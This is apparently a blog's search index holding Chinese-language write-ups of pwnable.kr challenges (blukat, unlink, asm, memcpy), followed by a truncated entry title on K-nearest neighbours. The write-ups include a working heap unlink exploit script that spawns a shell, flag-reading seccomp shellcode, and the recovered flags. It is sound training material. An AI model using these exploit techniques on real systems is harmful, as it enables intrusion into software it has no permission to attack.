<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>pwnable.kr —— blukat</title>
    <url>/df231074.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sometimes, pwnable is strange...</span><br><span class="line">hint: if this challenge is hard, you are a skilled player.</span><br><span class="line"></span><br><span class="line">ssh blukat@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><p>调试了下看到了password，输入就行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x6010a0 &lt;password&gt;:    0x736170203a746163      0x50203a64726f7773</span><br><span class="line">0x6010b0 &lt;password+16&gt;: 0x6f697373696d7265      0x6465696e6564206e</span><br></pre></td></tr></table></figure><p>密码是 <code>cat: password: Permission denied</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">blukat@prowl:~$ ./blukat</span><br><span class="line">guess the password!</span><br><span class="line">cat: password: Permission denied</span><br><span class="line">congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— unlink</title>
    <url>/9f35ac76.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy! how can I exploit unlink corruption?</span><br><span class="line"></span><br><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="punlink-c">unlink.c</span><a href="#punlink-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">typedef struct tagOBJ&#123;</span><br><span class="line">        struct tagOBJ* fd;</span><br><span class="line">        struct tagOBJ* bk;</span><br><span class="line">        char buf[8];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line">void shell()&#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void unlink(OBJ* P)&#123;</span><br><span class="line">        OBJ* BK;</span><br><span class="line">        OBJ* FD;</span><br><span class="line">        BK&#x3D;P-&gt;bk;</span><br><span class="line">        FD&#x3D;P-&gt;fd;</span><br><span class="line">        FD-&gt;bk&#x3D;BK;</span><br><span class="line">        BK-&gt;fd&#x3D;FD;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        malloc(1024);</span><br><span class="line">        OBJ* A &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* B &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line">        OBJ* C &#x3D; (OBJ*)malloc(sizeof(OBJ));</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; double linked list: A &lt;-&gt; B &lt;-&gt; C</span><br><span class="line">        A-&gt;fd &#x3D; B;</span><br><span class="line">        B-&gt;bk &#x3D; A;</span><br><span class="line">        B-&gt;fd &#x3D; C;</span><br><span class="line">        C-&gt;bk &#x3D; B;</span><br><span class="line"></span><br><span class="line">        printf(&quot;here is stack address leak: %p\n&quot;, &amp;A);</span><br><span class="line">        printf(&quot;here is heap address leak: %p\n&quot;, A);</span><br><span class="line">        printf(&quot;now that you have leaks, get shell!\n&quot;);</span><br><span class="line">        &#x2F;&#x2F; heap overflow!</span><br><span class="line">        gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; exploit this unlink!</span><br><span class="line">        unlink(B);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><h3><span id="pkuai-xin-xi">块信息</span><a href="#pkuai-xin-xi" class="header-anchor">#</a></h3><p>首先我们看下A、B、C的块信息，在printf处打断点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x804b408 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b428,</span><br><span class="line">  bk &#x3D; 0x0,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b420 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x804b440,</span><br><span class="line">  bk &#x3D; 0x804b410,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x804b438 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0x19,</span><br><span class="line">  fd &#x3D; 0x0,</span><br><span class="line">  bk &#x3D; 0x804b428,</span><br><span class="line">  fd_nextsize &#x3D; 0x0,</span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gdb-peda$ x&#x2F;20x 0x804b408</span><br><span class="line">0x804b408:	0x00000000	0x00000019	0x0804b428	0x00000000</span><br><span class="line">0x804b418:	0x00000000	0x00000000	0x00000000	0x00000019</span><br><span class="line">0x804b428:	0x0804b440	0x0804b410	0x00000000	0x00000000</span><br><span class="line">0x804b438:	0x00000000	0x00000019	0x00000000	0x0804b428</span><br><span class="line">0x804b448:	0x00000000	0x00000000	0x00000000	0x00020bb1</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">here is stack address leak: 0xffffd6c4</span><br><span class="line">here is heap address leak: 0x804b410</span><br><span class="line">now that you have leaks, get shell!</span><br></pre></td></tr></table></figure><p>可以看到三个块在内存上是连续的，同时代码里可以看到gets函数存在溢出，可以覆盖其他内存地址。</p><h3><span id="punlink">unlink</span><a href="#punlink" class="header-anchor">#</a></h3><p>我们要实现任意地址写，已有目标地址<code>target_addr</code>，写入值<code>expect_value</code><br>那么我们可以推导以下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A、B、C结构</span><br><span class="line"> --------------</span><br><span class="line">|+0 | fd       |</span><br><span class="line"> --------------</span><br><span class="line">|+4 | bk       |</span><br><span class="line"> --------------</span><br><span class="line">|+8 | buf[0-4] |</span><br><span class="line"> --------------</span><br><span class="line">|+12| buf[4-8] |</span><br><span class="line"> --------------</span><br><span class="line"></span><br><span class="line">BK&#x3D;P-&gt;bk;   &#x3D;&gt;BK &#x3D; *(P+4) </span><br><span class="line">FD&#x3D;P-&gt;fd;   &#x3D;&gt;FD &#x3D; *P</span><br><span class="line">FD-&gt;bk&#x3D;BK;  &#x3D;&gt;*((*P)+4)&#x3D;*(P+4)</span><br><span class="line">BK-&gt;fd&#x3D;FD;  &#x3D;&gt;*(*(P+4))&#x3D;*P</span><br></pre></td></tr></table></figure><p>因此存在两处任意地址写，我们主要利用下面那个<code>*(*(P+4))=*P</code></p><p>对于本题来说，已知A的栈地址A_stack和A的堆地址A_heap，举例我们需要向stack_addr(和A_stack存在一定偏移)中写入shell函数的地址shell_addr。</p><p>我们可以得到buf的地址是A_heap+8，可存shell_addr地址，我们在B的bk中写入目标栈地址stack_addr，这时我们可以写入<code>*stack_addr=*P</code>，我们需要<code>*P=shell_addr</code>，所以我们在B的fd中填入<code>A_heap+8</code>的值即可。</p><p>注意到有以下一段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80485ff:   8b 4d fc                 mov    -0x4(%ebp),%ecx</span><br><span class="line"> 8048602:   c9                      leave  </span><br><span class="line"> 8048603:   8d 61 fc                lea    -0x4(%ecx),%esp</span><br><span class="line"> 8048606:   c3                      ret</span><br></pre></td></tr></table></figure><p>将值取出赋值给ecx，后将*(ecx-4)的值赋值给esp。</p><p>所以我们需要进行修正，将<code>A_heap+8</code>，改成<code>A_heap+12</code>。</p><p>这时，赋值给ecx的值是<code>A_heap+12</code>，减去4后得到<code>A_heap+8</code>，最后赋值我们可以得到esp的值为<code>*(A_heap+8)</code>，也就是shell_addr，完成跳转。</p><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">p &#x3D; process(&quot;.&#x2F;unlink&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;here is stack address leak: &quot;)</span><br><span class="line">stack_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;here is heap address leak: &quot;)</span><br><span class="line">heap_address &#x3D; int(p.recvline(), 16)</span><br><span class="line">p.recvuntil(&quot;now that you have leaks, get shell!&quot;)</span><br><span class="line">print(&quot;stack_address:&quot;, hex(stack_address), &quot;heap_address&quot;, hex(heap_address))</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(0x080484EB) + b&#39;a&#39;*12 + p32(heap_address + 0xc) + p32(stack_address + 0x10)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5c619b760e10:~&#x2F;test# python3 unlink.py</span><br><span class="line">[+] Starting local process &#39;.&#x2F;unlink&#39;: pid 71</span><br><span class="line">stack_address: 0xffe33994 heap_address 0x955c410</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">unlink    unlink.py</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— asm</title>
    <url>/d7bb76ce.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! I think I know how to make shellcodes</span><br><span class="line"></span><br><span class="line">ssh asm@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>拖入ida伪代码可以看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">puts(&quot;Welcome to shellcoding practice challenge.&quot;);</span><br><span class="line">puts(&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.&quot;);</span><br><span class="line">puts(&quot;Try to make shellcode that spits flag using open()&#x2F;read()&#x2F;write() systemcalls only.&quot;);</span><br><span class="line">puts(&quot;If this does not challenge you. you should play &#39;asg&#39; challenge :)&quot;);</span><br><span class="line">s &#x3D; (char *)mmap((void *)0x41414000, 0x1000uLL, 7, 50, 0, 0LL);</span><br><span class="line">memset(s, 144, 0x1000uLL);</span><br><span class="line">v4 &#x3D; strlen(stub);</span><br><span class="line">memcpy(s, stub, v4);</span><br><span class="line">printf(&quot;give me your x64 shellcode: &quot;, stub, argv);</span><br><span class="line">read(0, s + 46, 0x3E8uLL);</span><br><span class="line">alarm(0xAu);</span><br><span class="line">chroot(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">sandbox(&quot;&#x2F;home&#x2F;asm_pwn&quot;);</span><br><span class="line">((void (*)(void))s)();</span><br></pre></td></tr></table></figure><p>也就是要求我们自己写shellcode，来实现读取flag的操作，注意，只能使用open，read，write三个系统函数。</p><p>本来网站<code>http://syscalls.kernelgrok.com/</code>可以查调用表的，不过好像因为维护上不去，所以我用它的github项目部署了一下<code>http://syscall.ycdxsb.cn/</code></p><p>这里为了方便些shellcode，我们可以用pwntools的shellcraft模块编写<code>http://docs.pwntools.com/en/stable/shellcraft/amd64.html</code></p><p>首先我们需要将函数名push到栈中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br></pre></td></tr></table></figure><p>由于是push进去的，所以这个时候rsp存的就是函数名，接着我们使用open打开这个文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br></pre></td></tr></table></figure><p>由于是封装好了，所以这里的参数和实际的open函数参数一致</p><p>对于64位函数，执行完后的返回值就在rax中，也就是我们open函数的fd值在rax中，然后我们需要使用read函数将内容读到rsp指向的内存中，如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><p>最后使用write函数将rsp内容输出到屏幕上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)</span><br><span class="line">#p &#x3D; process(&#39;asm&#39;)</span><br><span class="line">p &#x3D; remote(&#39;127.0.0.1&#39;,99026)</span><br><span class="line"></span><br><span class="line">filename &#x3D; &#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; shellcraft.amd64.pushstr(filename)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.open(&#39;rsp&#39;,0,0)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.read(&#39;rax&#39;,&#39;rsp&#39;,100)</span><br><span class="line">payload +&#x3D; shellcraft.amd64.write(1,&#39;rsp&#39;,100)</span><br><span class="line">p.recvuntil(&#39;shellcode: &#39;)</span><br><span class="line">p.sendline(asm(payload))</span><br><span class="line">print p.recv()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x64 bytes:</span><br><span class="line">    &#39;Mak1ng_shelLcodE_i5_veRy_eaSy\n&#39;</span><br><span class="line">    &#39;lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo&#39;</span><br><span class="line">Mak1ng_shelLcodE_i5_veRy_eaSy</span><br><span class="line">lease_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooo</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>Mak1ng_shelLcodE_i5_veRy_eaSy</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— memcpy</title>
    <url>/95b3b1b5.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Are you tired of hacking?, take some rest here.</span><br><span class="line">Just help me out with my small experiment regarding memcpy performance. </span><br><span class="line">after that, flag is yours.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;memcpy.c</span><br><span class="line"></span><br><span class="line">ssh memcpy@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="pmemcpy-c">memcpy.c</span><a href="#pmemcpy-c" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; compiled with : gcc -o memcpy memcpy.c -m32 -lm</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long long rdtsc()&#123;</span><br><span class="line">        asm(&quot;rdtsc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* slow_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	int i;</span><br><span class="line">	for (i&#x3D;0; i&lt;len; i++) &#123;</span><br><span class="line">		dest[i] &#x3D; src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char* fast_memcpy(char* dest, const char* src, size_t len)&#123;</span><br><span class="line">	size_t i;</span><br><span class="line">	&#x2F;&#x2F; 64-byte block fast copy</span><br><span class="line">	if(len &gt;&#x3D; 64)&#123;</span><br><span class="line">		i &#x3D; len &#x2F; 64;</span><br><span class="line">		len &amp;&#x3D; (64-1);</span><br><span class="line">		while(i-- &gt; 0)&#123;</span><br><span class="line">			__asm__ __volatile__ (</span><br><span class="line">			&quot;movdqa (%0), %%xmm0\n&quot;</span><br><span class="line">			&quot;movdqa 16(%0), %%xmm1\n&quot;</span><br><span class="line">			&quot;movdqa 32(%0), %%xmm2\n&quot;</span><br><span class="line">			&quot;movdqa 48(%0), %%xmm3\n&quot;</span><br><span class="line">			&quot;movntps %%xmm0, (%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm1, 16(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm2, 32(%1)\n&quot;</span><br><span class="line">			&quot;movntps %%xmm3, 48(%1)\n&quot;</span><br><span class="line">			::&quot;r&quot;(src),&quot;r&quot;(dest):&quot;memory&quot;);</span><br><span class="line">			dest +&#x3D; 64;</span><br><span class="line">			src +&#x3D; 64;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; byte-to-byte slow copy</span><br><span class="line">	if(len) slow_memcpy(dest, src, len);</span><br><span class="line">	return dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(stdout, 0, _IONBF, 0);</span><br><span class="line">	setvbuf(stdin, 0, _IOLBF, 0);</span><br><span class="line"></span><br><span class="line">	printf(&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;);</span><br><span class="line">	printf(&quot;The assignment is simple.\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line">	printf(&quot;- What is the best implementation of memcpy?        -\n&quot;);</span><br><span class="line">	printf(&quot;- 1. implement your own slow&#x2F;fast version of memcpy -\n&quot;);</span><br><span class="line">	printf(&quot;- 2. compare them with various size of data         -\n&quot;);</span><br><span class="line">	printf(&quot;- 3. conclude your experiment and submit report     -\n&quot;);</span><br><span class="line">	printf(&quot;-----------------------------------------------------\n&quot;);</span><br><span class="line"></span><br><span class="line">	printf(&quot;This time, just help me out with my experiment and get flag\n&quot;);</span><br><span class="line">	printf(&quot;No fancy hacking, I promise :D\n&quot;);</span><br><span class="line"></span><br><span class="line">	unsigned long long t1, t2;</span><br><span class="line">	int e;</span><br><span class="line">	char* src;</span><br><span class="line">	char* dest;</span><br><span class="line">	unsigned int low, high;</span><br><span class="line">	unsigned int size;</span><br><span class="line">	&#x2F;&#x2F; allocate memory</span><br><span class="line">	char* cache1 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	char* cache2 &#x3D; mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line">	src &#x3D; mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);</span><br><span class="line"></span><br><span class="line">	size_t sizes[10];</span><br><span class="line">	int i&#x3D;0;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; setup experiment parameters</span><br><span class="line">	for(e&#x3D;4; e&lt;14; e++)&#123;	&#x2F;&#x2F; 2^13 &#x3D; 8K</span><br><span class="line">		low &#x3D; pow(2,e-1);</span><br><span class="line">		high &#x3D; pow(2,e);</span><br><span class="line">		printf(&quot;specify the memcpy amount between %d ~ %d : &quot;, low, high);</span><br><span class="line">		scanf(&quot;%d&quot;, &amp;size);</span><br><span class="line">		if( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			printf(&quot;don&#39;t mess with the experiment.\n&quot;);</span><br><span class="line">			exit(0);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] &#x3D; size;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(1);</span><br><span class="line">	printf(&quot;ok, lets run the experiment with your configuration\n&quot;);</span><br><span class="line">	sleep(1);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; run experiment</span><br><span class="line">	for(i&#x3D;0; i&lt;10; i++)&#123;</span><br><span class="line">		size &#x3D; sizes[i];</span><br><span class="line">		printf(&quot;experiment %d : memcpy with buffer size %d\n&quot;, i+1, size);</span><br><span class="line">		dest &#x3D; malloc( size );</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		&#x2F;&#x2F; byte-to-byte memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line"></span><br><span class="line">		memcpy(cache1, cache2, 0x4000);		&#x2F;&#x2F; to eliminate cache effect</span><br><span class="line">		t1 &#x3D; rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		&#x2F;&#x2F; block-to-block memcpy</span><br><span class="line">		t2 &#x3D; rdtsc();</span><br><span class="line">		printf(&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;, t2-t1);</span><br><span class="line">		printf(&quot;\n&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	printf(&quot;thanks for helping my experiment!\n&quot;);</span><br><span class="line">	printf(&quot;flag : ----- erased in this source code -----\n&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是依次使用<code>fast_memcpy</code>和<code>slow_memcpy</code> 函数比较使用时间</p><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>随便输入范围内数字会出现<code>segmentation fault</code>，问题出在汇编指令<code>movntps</code>。</p><p>查阅资料可以看到，当使用这个指令时，内存必须按照16字节对齐</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The destination operand is a 128-bit or 256-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version) or 32-byte (VEX.256 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</span><br></pre></td></tr></table></figure><p>而用户使用malloc申请内存却是以8字节对齐的，假如用户申请内存大小x，那么分配后的块大小为<code>8*(int((x+4)/8)+1)</code>。</p><p>因此对于给定大小low和high限定，我们可以计算得到合适的内存大小x</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br></pre></td></tr></table></figure><h2><span id="pget-flag">get flag</span><a href="#pget-flag" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def get_input(low,high):</span><br><span class="line">    for i in xrange(low,high):</span><br><span class="line">        if ((i+4)%16&gt;&#x3D;9) or ((i+4)%16&#x3D;&#x3D;0):</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line">#context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">p &#x3D; remote(&quot;pwnable.kr&quot;,9022)</span><br><span class="line">#p &#x3D; process(&#39;.&#x2F;memcpy&#39;)</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    import time</span><br><span class="line">    time.sleep(1)</span><br><span class="line">    result &#x3D; p.recv()</span><br><span class="line">    result &#x3D; result.split(&quot;\n&quot;)[-1]</span><br><span class="line">    low &#x3D; int(result.split(&quot; &quot;)[5])</span><br><span class="line">    high &#x3D; int(result.split(&quot; &quot;)[7])</span><br><span class="line">    output &#x3D; get_input(low,high)</span><br><span class="line">    print &quot;info:%d %d , input: %d&quot;%(low,high,output)</span><br><span class="line">    p.sendline(str(output))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> ↵ 1  python CTF&#x2F;Challenges&#x2F;pwnable.kr&#x2F;part1&#x2F;memcpy&#x2F;memcpy.py</span><br><span class="line">[+] Opening connection to pwnable.kr on port 9022: Done</span><br><span class="line">info:8 16 , input: 8</span><br><span class="line">info:16 32 , input: 21</span><br><span class="line">info:32 64 , input: 37</span><br><span class="line">info:64 128 , input: 69</span><br><span class="line">info:128 256 , input: 133</span><br><span class="line">info:256 512 , input: 261</span><br><span class="line">info:512 1024 , input: 517</span><br><span class="line">info:1024 2048 , input: 1029</span><br><span class="line">info:2048 4096 , input: 2053</span><br><span class="line">info:4096 8192 , input: 4101</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">ok, lets run the experiment with your configuration</span><br><span class="line">experiment 1 : memcpy with buffer size 8</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 2036</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 172</span><br><span class="line"></span><br><span class="line">experiment 2 : memcpy with buffer size 21</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 220</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 252</span><br><span class="line"></span><br><span class="line">experiment 3 : memcpy with buffer size 37</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 336</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 388</span><br><span class="line"></span><br><span class="line">experiment 4 : memcpy with buffer size 69</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 508</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 182</span><br><span class="line"></span><br><span class="line">experiment 5 : memcpy with buffer size 133</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1042</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 152</span><br><span class="line"></span><br><span class="line">experiment 6 : memcpy with buffer size 261</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 1854</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 204</span><br><span class="line"></span><br><span class="line">experiment 7 : memcpy with buffer size 517</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 3658</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 186</span><br><span class="line"></span><br><span class="line">experiment 8 : memcpy with buffer size 1029</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 7146</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 374</span><br><span class="line"></span><br><span class="line">experiment 9 : memcpy with buffer size 2053</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 14326</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 680</span><br><span class="line"></span><br><span class="line">experiment 10 : memcpy with buffer size 4101</span><br><span class="line">ellapsed CPU cycles for slow_memcpy : 30404</span><br><span class="line">ellapsed CPU cycles for fast_memcpy : 1284</span><br><span class="line"></span><br><span class="line">thanks for helping my experiment!</span><br><span class="line">flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p><code>flag</code>:<code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code></p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>pwnable.kr</category>
        <category>Toddler&#39;sBottle</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
        <tag>Toddler&#39;s Bottle</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习1——K近邻算法</title>
    <url>/437066e7.html</url>
